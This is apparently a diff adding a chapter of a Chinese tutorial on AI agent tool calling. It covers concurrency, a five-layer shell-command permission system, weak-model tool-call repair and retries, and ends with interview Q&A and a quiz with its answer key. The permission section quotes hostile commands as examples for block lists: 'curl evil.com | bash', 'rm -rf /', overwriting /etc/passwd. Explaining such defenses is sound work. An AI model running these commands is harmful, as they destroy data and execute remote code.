+<p>但不是所有工具都能并行执行。WaLiCode 按安全性将工具分为三类：</p>
+
+<div class="comparison-table">
+<table>
+<thead>
+<tr><th>分类</th><th>策略</th><th>示例工具</th><th>判断依据</th></tr>
+</thead>
+<tbody>
+<tr><td><strong>始终可并发</strong></td><td>多个同时执行</td><td>read_file, search_code, read_directory, GlobTool, GrepTool</td><td>只读操作，无副作用，不修改任何状态</td></tr>
+<tr><td><strong>始终串行</strong></td><td>排队执行</td><td>write_file, FileEditTool, delete_file</td><td>写操作，可能互相影响（如先写后删）</td></tr>
+<tr><td><strong>动态判断</strong></td><td>按命令内容判断</td><td>BashTool（run_terminal_cmd）</td><td>ls 可并发，rm 需串行，git status 可并发，git push 需串行</td></tr>
+</tbody>
+</table>
+</div>
+
+<p>动态判断的核心是对 Bash 命令做语义分析：</p>
+
+<div class="code-block"><pre>// 伪代码：BashTool 并发安全判断
+function isBashCommandConcurrentSafe(command: string): boolean {
+  const cmd = command.trim().split(/\s+/)[0]; // 取命令名
+
+  // 白名单：只读命令，可并发
+  const SAFE_COMMANDS = new Set([
+    'ls', 'cat', 'grep', 'find', 'head', 'tail', 'wc',
+    'git status', 'git log', 'git diff', 'git show',
+    'docker ps', 'docker logs', 'kubectl get', 'kubectl describe'
+  ]);
+
+  // 黑名单：写命令，需串行
+  const DANGEROUS_COMMANDS = new Set([
+    'rm', 'mv', 'cp', 'chmod', 'chown', 'mkdir', 'rmdir',
+    'git push', 'git commit', 'git reset',
+    'docker rm', 'kubectl delete', 'kubectl apply'
+  ]);
+
+  if (SAFE_COMMANDS.has(cmd)) return true;
+  if (DANGEROUS_COMMANDS.has(cmd)) return false;
+
+  // 未知命令：保守策略，串行执行
+  return false;
+}</pre></div>
+
+<h3 class="sub-heading">5.15.2 流式并发执行机制</h3>
+
+<p>传统做法是等 AI 输出完所有内容后，再统一执行工具调用。但 WaLiCode 采用<strong>流式并发</strong>——AI 流式输出时，工具调用一到就立即开始执行，不等 AI 输出完。</p>
+
+<div class="flowchart-container" data-flowchart='{"nodes":[{"id":"ai_stream","label":"AI 流式输出","type":"start"},{"id":"recv_tool","label":"收到 tool_call","type":"process"},{"id":"classify","label":"并发安全分类","type":"decision"},{"id":"concurrent","label":"并发执行\n(read_file等)","type":"process"},{"id":"queue","label":"排队串行\n(write_file等)","type":"process"},{"id":"result","label":"结果 yield 给 UI","type":"end"}],"edges":[{"from":"ai_stream","to":"recv_tool"},{"from":"recv_tool","to":"classify"},{"from":"classify","to":"concurrent","label":"只读"},{"from":"classify","to":"queue","label":"写操作"},{"from":"concurrent","to":"result"},{"from":"queue","to":"result"}]}'></div>
+
+<p>关键设计点：</p>
+<ul>
+<li><strong>立即执行</strong>：工具调用一到就执行，不等 AI 输出完。3 个 read_file 并行只需 1 倍时间</li>
+<li><strong>按完成顺序 yield</strong>：哪个工具先完成就先返回结果，保证 UI 实时更新</li>
+<li><strong>中断机制</strong>：AwaitingUserConfirmation（需用户确认）时立即中断所有排队工具</li>
+</ul>
+
+<div class="code-block"><pre>// 伪代码：ToolConcurrencyController 核心结构
+class ToolConcurrencyController {
+  private concurrentQueue: ToolCall[] = [];  // 并发队列
+  private serialQueue: ToolCall[] = [];       // 串行队列
+  private running: Map&lt;string, AbortController&gt; = new Map();
+
+  addTool(toolCall: ToolCall, index: number): UIToolCall {
+    if (this.isConcurrentSafe(toolCall.name, toolCall.args)) {
+      // 只读工具：立即并发执行
+      this.executeConcurrent(toolCall);
+    } else {
+      // 写工具：排队串行执行
+      this.serialQueue.push(toolCall);
+      this.tryExecuteNextSerial();
+    }
+    return this.toUIToolCall(toolCall, index);
+  }
+
+  private async executeConcurrent(toolCall: ToolCall) {
+    const controller = new AbortController();
+    this.running.set(toolCall.id, controller);
+    try {
+      const result = await executeTool(toolCall, controller.signal);
+      this.onToolComplete(toolCall, result);
+    } finally {
+      this.running.delete(toolCall.id);
+    }
+  }
+
+  private async tryExecuteNextSerial() {
+    if (this.serialRunning) return;  // 已有串行任务在执行
+    const next = this.serialQueue.shift();
+    if (!next) return;
+    this.serialRunning = true;
+    try {
+      const result = await executeTool(next);
+      this.onToolComplete(next, result);
+    } finally {
+      this.serialRunning = false;
+      this.tryExecuteNextSerial();  // 递归执行下一个
+    }
+  }
+}</pre></div>
+
+<h3 class="sub-heading">5.15.3 五层权限递进系统</h3>
+
+<p>Agent 能执行 Shell 命令是好事，但也意味着它能执行 <code>rm -rf /</code>。生产级 Agent 必须有权限控制。WaLiCode 设计了<strong>五层递进</strong>的权限系统：</p>
+
+<div class="flowchart-container" data-flowchart='{"nodes":[{"id":"l1","label":"Layer 1: Bash AST 解析\n(&lt;1ms)","type":"start"},{"id":"l1d","label":"白名单/黑名单?","type":"decision"},{"id":"l2","label":"Layer 2: 正则规则匹配\n(&lt;1ms)","type":"process"},{"id":"l2d","label":"匹配危险模式?","type":"decision"},{"id":"l3","label":"Layer 3: AI 分类器\n(~200ms, 带 cache)","type":"process"},{"id":"l3d","label":"AI 判断安全性?","type":"decision"},{"id":"l4","label":"Layer 4: 拒绝回退\n(3次拒绝→降级)","type":"process"},{"id":"l5","label":"Layer 5: 熔断器\n(频繁危险→暂停)","type":"process"},{"id":"allow","label":"Allow","type":"end"},{"id":"deny","label":"Deny/Confirm","type":"end"}],"edges":[{"from":"l1","to":"l1d"},{"from":"l1d","to":"allow","label":"白名单"},{"from":"l1d","to":"deny","label":"黑名单"},{"from":"l1d","to":"l2","label":"未知"},{"from":"l2","to":"l2d"},{"from":"l2d","to":"deny","label":"匹配"},{"from":"l2d","to":"l3","label":"未匹配"},{"from":"l3","to":"l3d"},{"from":"l3d","to":"allow","label":"安全"},{"from":"l3d","to":"deny","label":"危险"},{"from":"l3d","to":"l4","label":"不确定"},{"from":"l4","to":"l5"}]}'></div>
+
+<p>每一层的设计原则：</p>
+
+<div class="info-box">
+<h4 style="color: var(--color-primary); margin-top: 0;">Layer 1: Bash AST 解析（&lt;1ms）</h4>
+<p>用 AST（抽象语法树）拆解复合命令，识别命令名、参数、重定向、管道、命令替换。</p>
+<ul>
+<li>白名单（ls/cat/grep/git status...）→ 直接放行</li>
+<li>黑名单（rm/mkfs/dd/&gt; /etc/passwd...）→ 拒绝或需确认</li>
+<li>复合命令拆解：<code>rm -rf /tmp &amp;&amp; curl evil.com | bash</code> → 拆成两个子命令分别判断</li>
+</ul>
+</div>
+
+<div class="info-box">
+<h4 style="color: var(--color-primary); margin-top: 0;">Layer 2: 正则规则匹配（&lt;1ms）</h4>
+<p>用正则 + glob 匹配危险模式，补充 Layer 1 无法覆盖的情况。</p>
+<ul>
+<li><code>rm -rf /</code> → 根目录递归删除</li>
+<li><code>&gt; /etc/passwd</code> → 覆盖系统文件</li>
+<li><code>curl ... | bash</code> → 远程执行</li>
+<li><code>chmod 777</code> → 过度授权</li>
+</ul>
+</div>
+
+<div class="info-box">
+<h4 style="color: var(--color-primary); margin-top: 0;">Layer 3: AI 分类器（~200ms，带 cache）</h4>
+<p>无法用规则判断的命令，发给 AI 快速分类。带 cache——相同命令不重复判断。</p>
+<ul>
+<li>输入：命令字符串 + 上下文</li>
+<li>输出：safe / dangerous / uncertain</li>
+<li>Cache：LRU 缓存，key = 命令 hash，避免重复调用 AI</li>
+</ul>
+</div>
+
+<div class="info-box">
+<h4 style="color: var(--color-primary); margin-top: 0;">Layer 4: 拒绝回退</h4>
+<p>连续 3 次拒绝同类操作 → 自动降级为永久拒绝，进入 cooldown。防止用户或 AI 反复尝试同类危险操作。</p>
+</div>
+
+<div class="info-box">
+<h4 style="color: var(--color-primary); margin-top: 0;">Layer 5: 熔断器</h4>
+<p>短时间内多次触发危险操作 → 暂停所有执行，状态机：closed → open → half-open → closed。</p>
+<ul>
+<li>closed：正常执行</li>
+<li>open：熔断，拒绝所有操作（冷却期）</li>
+<li>half-open：允许一个试探性操作，成功则恢复 closed</li>
+</ul>
+</div>
+
+<p><strong>核心原则：fail-closed</strong>——不理解的命令归类为 <code>too-complex</code>，必须交互确认。宁可多问一次，不可放行危险操作。</p>
+
+<h3 class="sub-heading">5.15.4 弱模型兼容层</h3>
+
+<p>不是所有模型都像 Claude/GPT-4 那样输出干净的结构化 tool_calls。弱模型（如 DeepSeek、Qwen、Llama）经常出问题。WaLiCode 设计了两道防线：</p>
+
+<h4 style="color: var(--color-accent);">问题 1：畸形 tool_call name</h4>
+<p>弱模型有时把参数拼到 name 字段里：</p>
+
+<div class="code-block"><pre>// 正常输出
+{ name: 'execute_ssh_command', args: { command: 'ls', connectionId: 'xxx' } }
+
+// 畸形输出（参数泄漏到 name 字段）
+{ name: 'execute_ssh_command" connectionId="xxx" timeout="30000" command="ls',
+  args: {} }
+
+// 修复方案：repairToolCall()
+function repairToolCall(toolCall: ToolCall): ToolCall {
+  const raw = toolCall.name;
+  // 提取第一个合法 token 作为真实 name
+  const match = raw.match(/^([\w_]+)/);
+  if (!match) return toolCall;
+  const realName = match[1];
+  const rest = raw.slice(realName.length);  // 剩余部分
+
+  // 从剩余部分用正则提取 key="value" 参数
+  const args: Record&lt;string, string&gt; = {};
+  const argRegex = /(\w+)="([^"]*)"/g;
+  let m;
+  while ((m = argRegex.exec(rest)) !== null) {
+    args[m[1]] = m[2];
+  }
+
+  return { ...toolCall, name: realName, args: { ...args, ...toolCall.args } };
+}</pre></div>
+
+<h4 style="color: var(--color-accent);">问题 2：文本内嵌工具调用</h4>
+<p>弱模型有时不输出结构化 tool_calls，而是在文本中直接写工具调用：</p>
+
+<div class="code-block"><pre>// AI 文本输出（无结构化 tool_calls）
+// "我来查看一下文件内容：read_file(path="/tmp/test.py")"
+// "然后搜索关键词：search_code(query="TODO")"
+
+// 修复方案：parseToolCallsFromText()
+function parseToolCallsFromText(text: string): ToolCall[] {
+  const calls: ToolCall[] = [];
+  // 匹配 toolName(key="value", key2="value2") 格式
+  const regex = /(\w+)\(([^)]*)\)/g;
+  let match;
+  while ((match = regex.exec(text)) !== null) {
+    const name = match[1];
+    const argsStr = match[2];
+    const args: Record&lt;string, string&gt; = {};
+
+    // 解析参数
+    const argRegex = /(\w+)="([^"]*)"/g;
+    let m;
+    while ((m = argRegex.exec(argsStr)) !== null) {
+      args[m[1]] = m[2];
+    }
+
+    calls.push({ id: generateId(), name, args });
+  }
+  return calls;
+}</pre></div>
+
+<p>这两道防线确保 Agent 能兼容从 Claude 到 Llama 的各种模型——不是所有用户都用顶级模型。</p>
+
+<h3 class="sub-heading">5.15.5 指数退避重试</h3>
+
+<p>工具执行可能遇到临时性错误（429 限流、503 服务不可用、网络超时）。WaLiCode 使用指数退避重试：</p>
+
+<div class="code-block"><pre>async function executeToolWithRetry(
+  toolCall: ToolCall,
+  maxRetries: number = 3  // agent 模式 5 次
+): Promise&lt;ToolResult&gt; {
+  let lastError: Error;
+
+  for (let attempt = 0; attempt &lt;= maxRetries; attempt++) {
+    try {
+      return await executeTool(toolCall);
+    } catch (err) {
+      lastError = err;
+
+      // 判断是否可重试
+      if (!isRetryable(err)) throw err;
+      if (attempt === maxRetries) throw err;
+
+      // 指数退避：1s → 2s → 4s → 8s
+      const delayMs = Math.pow(2, attempt) * 1000;
+      await abortableSleep(delayMs);
+    }
+  }
+  throw lastError;
+}
+
+function isRetryable(err: Error): boolean {
+  if (err instanceof HTTPError) {
+    return [429, 500, 502, 503, 504].includes(err.status);
+  }
+  return err instanceof NetworkError || err instanceof TimeoutError;
+}</pre></div>
+
+<p>重试策略的关键决策：</p>
+<ul>
+<li><strong>哪些错误可重试</strong>：429（限流）、5xx（服务端错误）、网络超时。400/401/403 不重试（请求本身有问题）</li>
+<li><strong>退避间隔</strong>：2^n 秒，避免雪崩式重试压垮服务端</li>
+<li><strong>最大重试次数</strong>：chat 模式 3 次，agent 模式 5 次（agent 模式更宽容因为用户期望自动恢复）</li>
+</ul>
+
+<div class="summary-box">
+<div class="summary-title">🔗 5.15 核心要点</div>
+<p><strong>工具并发控制</strong>：只读并发、写串行、Bash 动态判断——在安全的前提下最大化并行度。</p>
+<p><strong>五层权限递进</strong>：AST → 规则 → AI → 拒绝回退 → 熔断器，分层递进，每层可独立放行或拒绝，fail-closed 原则。</p>
+<p><strong>弱模型兼容</strong>：畸形修复 + 文本解析，让 Agent 不依赖顶级模型也能工作。</p>
+<p><strong>指数退避重试</strong>：临时错误自动重试，指数退避避免雪崩，区分可重试和不可重试错误。</p>
+</div>
+
+<div class="summary-box">
+  <div class="summary-title">📋 八股总结 — 面试高频考点</div>
+
+  <div class="qa-item">
+    <div class="qa-question">Q1: Agent 为什么要使用工具？LLM 本身不够吗？</div>
+    <div class="qa-answer">
+      LLM 有固有的能力边界：① 无法获取实时信息（训练截止后的知识）；② 无法执行代码和精确计算；③ 无法读写文件和数据库；④ 无法与外部服务交互。<br><br>
+      工具弥补了这些边界。LLM 是大脑负责推理决策，工具是手脚负责执行。没有工具的 Agent 只能"纸上谈兵"。
+    </div>
+  </div>
+
+  <div class="qa-item">
+    <div class="qa-question">Q2: Function Calling 的完整流程是什么？</div>
+    <div class="qa-answer">
+      ① 定义工具的 JSON Schema（名称、描述、参数）<br>
+      ② 将工具定义和用户请求一起传给 LLM<br>
+      ③ LLM 判断是否需要工具，需要则输出结构化函数调用（函数名+参数JSON）<br>
+      ④ Agent 框架解析函数调用，实际执行对应函数<br>
+      ⑤ 将工具返回结果回传给 LLM<br>
+      ⑥ LLM 基于结果生成自然语言回答给用户<br><br>
+      关键：LLM 只决定"调用什么"，不实际执行。执行由框架完成。
+    </div>
+  </div>
+
+  <div class="qa-item">
+    <div class="qa-question">Q3: Tool 和 Skill 的区别是什么？</div>
+    <div class="qa-answer">
+      <strong>Tool</strong>：原子工具，单个函数，如 search(query)、write_file(path)。粒度细，可组合。<br>
+      <strong>Skill</strong>：技能，多个工具 + Prompt + 流程的组合包。如"发邮件技能" = 起草 + 查联系人 + 发送。粒度粗，可直接使用。<br><br>
+      类比：Tool 是螺丝刀，Skill 是工具箱。Skill 让 Agent 不用每次从头推理工具组合，直接调用预设流程。
+    </div>
+  </div>
+
+  <div class="qa-item">
+    <div class="qa-question">Q4: Skill 匹配的混合策略是什么？为什么单一策略不够？</div>
+    <div class="qa-answer">
+      <strong>混合策略</strong>：规则匹配优先（确定性最高）→ 语义匹配兜底（覆盖面最广）→ 关键词匹配补充（速度最快）。三种策略互补而非互斥。<br><br>
+      <strong>单一策略的问题</strong>：关键词匹配对隐式表述无效（"外面冷不冷"不含"天气"）；语义匹配对精确模式不如规则高效（"帮我发邮件"还要算相似度）；规则匹配无法覆盖未预见的新表述。混合策略把各策略的优势最大化，短板互相弥补。
+    </div>
+  </div>
+
+  <div class="qa-item">
+    <div class="qa-question">Q5: 三层 Skill 体系中，L1 组合层的职责是什么？</div>
+    <div class="qa-answer">
+      <strong>L1 组合层</strong>的职责是<strong>工作流编排</strong>——组合多个 L0 原子操作，按步骤顺序执行完整流程。如代码审查流程 = 读文件(L0) → 静态分析(L0) → 搜索漏洞(L0) → 生成报告。<br><br>
+      L1 不是做原子操作（那是L0的职责），也不是理解业务语义（那是L2的职责）。L1 是"流程管家"——确保步骤顺序正确、依赖关系正确、中间结果正确传递。
+    </div>
+  </div>
+
+  <div class="qa-item">
+    <div class="qa-question">Q6: Skill 自动沉淀为什么要求"3次以上成功率>80%"？如何避免沉淀低质量 Skill？</div>
+    <div class="qa-answer">
+      <strong>3次阈值</strong>：1次可能是偶然，2次可能是巧合，3次以上才说明操作模式确实稳定可复用。<br>
+      <strong>80%成功率</strong>：成功率低于80%说明操作模式本身不够可靠，沉淀出来反而增加系统负担。80%是经验阈值，太低会沉淀低质量Skill，太高会遗漏有价值的模式。<br><br>
+      <strong>避免低质量沉淀的保障</strong>：① 成功率阈值过滤不稳定模式；② 沉淀后持续监控质量指标（成功率、响应时间、用户满意度），低于标准自动降级或淘汰；③ 半自动沉淀需用户确认后才正式注册；④ 版本管理支持回滚到稳定版本。
+    </div>
+  </div>
+
+  <div class="qa-item">
+    <div class="qa-question">Q7: 当 Agent 有大量工具时，如何高效选择？</div>
+    <div class="qa-answer">
+      三种策略：<br>
+      <strong>① 全量传入</strong>：适合 20 个以内工具，简单直接。<br>
+      <strong>② 语义检索</strong>：工具描述做 embedding，查询时检索 Top-K 相关工具。适合 20~100 个工具。<br>
+      <strong>③ 路由分层</strong>：先路由到工具类别，再在类别内选择。适合 100+ 工具。<br><br>
+      核心思想：减少每次传给 LLM 的工具数量，降低 token 消耗，提升选择准确率。
+    </div>
+  </div>
+
+  <div class="qa-item">
+    <div class="qa-question">Q8: MCP 协议解决了什么问题？与 Function Calling 是什么关系？</div>
+    <div class="qa-answer">
+      <strong>解决的问题</strong>：工具定义碎片化。各框架自定义工具格式，一个工具要适配多个框架。<br><br>
+      <strong>与 Function Calling 的关系</strong>：不冲突。Function Calling 是 LLM 层面的能力（让模型输出结构化调用），MCP 是协议层面的标准（让工具定义和发现统一）。MCP Server 定义工具 → Agent 框架通过 MCP 获取工具描述 → 传给 LLM 做 Function Calling。
+    </div>
+  </div>
+
+  <div class="qa-item">
+    <div class="qa-question">Q9: 意图识别在工具路由中的作用是什么？隐式意图如何处理？</div>
+    <div class="qa-answer">
+      <strong>作用</strong>：意图识别是工具路由的"入口"，决定了 Agent 选择哪类工具。四类意图（信息获取/代码执行/文件操作/通信交互）对应四类工具集。<br><br>
+      <strong>隐式意图</strong>：用户不会总是明确说"我要搜索"。"外面冷不冷"和"查天气"表面不同但意图相同。隐式意图识别需要理解用户<strong>想达成的目标</strong>而非关键词匹配——生产环境通常用 LLM 做意图分类而非简单关键词。<br><br>
+      <strong>复合意图</strong>："帮我搜索并用Python分析"包含两个意图，需要拆解后依次执行，后置意图可能依赖前置意图的结果。
+    </div>
+  </div>
+
+  <div class="qa-item">
+    <div class="qa-question">Q10: 上下文工程如何优化工具管理？JIT加载和Tool RAG的核心思路是什么？</div>
+    <div class="qa-answer">
+      <strong>核心思路</strong>：给 LLM "刚好够用"的信息，不多不少。50个工具的全量描述消耗5000 token，但LLM只会用到1~3个工具。<br><br>
+      <strong>JIT加载</strong>：不一次性传入所有工具描述，按意图只加载相关的3~5个工具。有效信号密度从6%提升到接近100%。<br>
+      <strong>Tool RAG</strong>：把工具描述做embedding存入向量库，请求来时检索最相关的Top-K工具，只把这几个传给LLM。类似文档RAG但检索的是工具而非文档。<br><br>
+      对比：全量传入5000 token/65%准确率 → JIT/RAG 300 token/85%准确率，token节省90%+，准确率提升20%+。
+    </div>
+  </div>
+
+  <div class="qa-item">
+    <div class="qa-question">Q11: 多轮工具调用的Context膨胀问题如何解决？</div>
+    <div class="qa-answer">
+      多轮工具调用会让Context从100 token膨胀到数千token，原始请求占比不到2%。三种压缩策略：<br><br>
+      <strong>① 摘要替代原始结果</strong>：不让工具的完整输出进入Context，而是用LLM生成200 token的摘要替代2000 token的原始结果。<br>
+      <strong>② 选择性保留关键字段</strong>：天气API返回20个字段，只保留温度+描述+风速这3个用户关心的字段。<br>
+      <strong>③ 向量库归档</strong>：完整结果存入向量数据库，Context中只放摘要+引用ID。需要细节时按ID检索。<br><br>
+      核心原则：<strong>记要点，存细节</strong>——要点放Context（短期），细节放向量库（长期）。
+    </div>
+  </div>
+</div>
+
+<!-- ===== 课后考试 ===== -->
+<div id="quizArea"></div>
+
+<script>
+const ch05Questions = [
+  {
+    type: 'single',
+    question: 'Function Calling 中，谁负责实际执行工具函数？',
+    options: ['LLM 自己执行', 'Agent 框架执行', '用户手动执行', '操作系统执行'],
+    answer: [1],
+    explanation: 'LLM 只决定"调用什么工具、传什么参数"，实际执行由 Agent 框架完成。LLM 不直接执行代码，只输出结构化调用指令。'
+  },
+  {
+    type: 'single',
+    question: '工具定义中使用什么格式描述工具的参数？',
+    options: ['XML', 'YAML', 'JSON Schema', '正则表达式'],
+    answer: [2],
+    explanation: 'Function Calling 使用 JSON Schema 描述工具参数，包括参数类型、描述、是否必填等。LLM 通过这些描述理解工具能力。'
+  },
+  {
+    type: 'single',
+    question: 'Skill 和 Tool 的关系可以类比为？',
+    options: ['零件和整机', '螺丝刀和工具箱', '函数和变量', '数据库和表'],
+    answer: [1],
+    explanation: 'Tool 是原子工具（螺丝刀），Skill 是多个工具+Prompt+流程的组合包（工具箱）。Skill 让 Agent 直接调用预设流程。'
+  },
+  {
+    type: 'single',
+    question: '当 Agent 有 100+ 工具时，最适合的工具选择策略是？',
+    options: ['全量传入 LLM', '语义检索 Top-K 工具', '路由分层选择', '随机选择'],
+    answer: [2],
+    explanation: '100+ 工具适合路由分层：先路由到工具类别（信息类/代码类/文件类），再在类别内用 LLM 选择。全量传入 token 消耗太大，语义检索适合中等规模。'
+  },
+  {
+    type: 'single',
+    question: '以下哪个不是 Agent 工具调用的典型应用场景？',
+    options: ['搜索互联网获取实时信息', '执行 Python 代码做计算', '训练新的 LLM 模型', '发送邮件通知用户'],
+    answer: [2],
+    explanation: '训练新 LLM 需要大量 GPU 资源和很长时间，不适合 Agent 实时工具调用。其他三项都是常见的工具调用场景。'
+  },
+  {
+    type: 'multiple',
+    question: '以下哪些是 Function Calling 相比 Prompt 工程解析的优势？（多选）',
+    options: [
+      '输出格式更可靠（模型层面训练过）',
+      '支持并行调用多个函数',
+      '不再需要写 System Prompt',
+      '工具描述更结构化（JSON Schema）'
+    ],
+    answer: [0, 1, 3],
+    explanation: 'Function Calling 仍需要 System Prompt（设定 Agent 行为），但它提供了更可靠的格式输出、并行调用支持和结构化工具描述。'
+  },
+  {
+    type: 'multiple',
+    question: '一个完整的 Skill（技能）通常包含哪些组成部分？（多选）',
+    options: ['一组工具', '专用 Prompt', '执行流程', '训练数据集'],
+    answer: [0, 1, 2],
+    explanation: 'Skill = 工具 + Prompt + 流程。不需要训练数据集，Skill 是基于现有 LLM 能力的组合封装。'
+  },
+  {
+    type: 'multiple',
+    question: '关于 MCP 协议，以下说法正确的是？（多选）',
+    options: [
+      'MCP 统一了工具的定义和发现接口',
+      '一个 MCP Server 可被多个框架复用',
+      'MCP 替代了 Function Calling，不需要 LLM 参与',
+      'MCP 使用 JSON-RPC 2.0 通信'
+    ],
+    answer: [0, 1, 3],
+    explanation: 'MCP 没有替代 Function Calling，而是标准化了工具的接口层。LLM 仍然通过 Function Calling 决定调用什么工具，MCP 负责工具的定义和执行。'
+  },
+  {
+    type: 'single',
+    question: '用户说"外面冷不冷"，Agent应识别为哪种意图类型？',
+    options: ['代码执行', '文件操作', '信息获取', '通信交互'],
+    answer: [2],
+    explanation: '"外面冷不冷"虽然没提"查天气"，但隐式意图是获取天气信息。意图识别的核心是理解用户想达成的目标，而非关键词匹配。'
+  },
+  {
+    type: 'single',
+    question: 'Tool RAG检索策略的核心思路是什么？',
+    options: [
+      '把所有工具描述一次性传给LLM',
+      '将工具描述做embedding存入向量库，请求时检索Top-K相关工具',
+      '按工具名称排序后逐个传给LLM',
+      '让用户手动选择需要的工具'
+    ],
+    answer: [1],
+    explanation: 'Tool RAG 与文档 RAG 类似，把工具描述做 embedding 存入向量库，请求来时检索最相关的 Top-K 工具，只把这几个传给 LLM。减少 token 消耗，提升选择准确率。'
+  },
+  {
+    type: 'single',
+    question: '工具结果压缩策略中，"向量库归档详细结果"的做法是什么？',
+    options: [
+      '删除所有工具输出只保留最后一轮',
+      '完整结果存入向量库，Context中只保留摘要和引用ID',
+      '把工具输出直接存入本地文件不回传LLM',
+      '让LLM记住所有原始结果不做任何压缩'
+    ],
+    answer: [1],
+    explanation: '向量库归档策略：完整结果存入向量数据库，Context中只放摘要+引用ID。后续需要细节时通过引用ID精确检索。这样Context保持精瘦，细节不丢失。'
+  },
+  {
+    type: 'multiple',
+    question: '关于Pydantic验证工具参数和错误重提示，以下说法正确的是？（多选）',
+    options: [
+      'Pydantic可以在工具执行前拦截参数类型错误',
+      '参数校验失败时应直接抛异常终止整个流程',
+      '重提示LLM修正参数时，应告知具体错误信息（如哪个字段、什么约束）',
+      '重试次数应设上限（2~3次），超限后降级兜底而非无限重试'
+    ],
+    answer: [0, 2, 3],
+    explanation: '参数校验失败不应直接终止流程（B选项错），而是把具体错误反馈给LLM让其修正。重试要有上限，超限后用默认值填充或跳过可选参数作为降级兜底。'
+  },
+  {
+    type: 'single',
+    question: 'Skill 匹配策略中，哪种策略的准确率最高？',
+    options: ['关键词匹配（速度快但覆盖面窄）', '语义匹配（embedding相似度）', '规则匹配（正则/条件匹配）', '混合策略（规则优先+语义兜底+关键词补充）'],
+    answer: [3],
+    explanation: '混合策略综合了三种方法的优势：规则匹配处理高确定性场景（准确率95%+），语义匹配兜底模糊表述（准确率80~90%），关键词补充边缘场景。单一策略都有盲区，混合策略准确率可达90%以上。'
+  },
+  {
+    type: 'single',
+    question: '三层 Skill 体系中，L1 组合层的主要职责是？',
+    options: ['原子操作（单个工具调用）', '流程编排（组合L0原子操作按步骤执行）', '业务理解（领域专家级的语义判断）', '用户界面（交互和展示）'],
+    answer: [1],
+    explanation: 'L1 组合层的职责是工作流编排——组合多个 L0 原子操作，按步骤顺序执行完整流程。原子操作是L0的职责，业务理解是L2的职责，L1只做流程编排。'
+  },
+  {
+    type: 'multiple',
+    question: 'Skill 自动沉淀的触发条件为什么是"3次以上成功率>80%"？以下说法正确的是？（多选）',
+    options: [
+      '1次可能是偶然，3次以上说明操作模式稳定可复用',
+      '成功率80%是最低阈值，低于此说明模式不可靠',
+      '阈值越高越好，应该设为100%成功率才沉淀',
+      '沉淀后需持续监控质量指标，低于标准应降级或淘汰'
+    ],
+    answer: [0, 1, 3],
+    explanation: '1次确实可能是偶然，3次以上才说明模式稳定（A正确）。80%是经验最低阈值，太低会沉淀低质量Skill（B正确）。但100%过于严苛，会遗漏有价值的模式（C错误）。沉淀后持续监控是必要的质量保障（D正确）。'
+  },
+  {
+    type: 'multiple',
+    question: 'Skill 分层体系中，不分层会导致哪些问题？（多选）',
+    options: [
+      '职责混淆：原子操作和业务逻辑混在一起',
+      '维护困难：修改底层会影响所有上层',
+      '性能浪费：简单任务调用复杂Skill消耗过多token',
+      '安全性提升：所有Skill在同一层级更方便权限管理'
+    ],
+    answer: [0, 1, 2],
+    explanation: '不分层导致职责混淆（A）、维护困难（B）和性能浪费（C）。D选项错误——不分层反而不利于权限管理，分层后可以按层级控制访问权限（如L0内部工具不允许外部直接调用）。'
+  }
+];
+
+setTimeout(() => { Quiz.render('quizArea', ch05Questions); }, 500);
+</script>
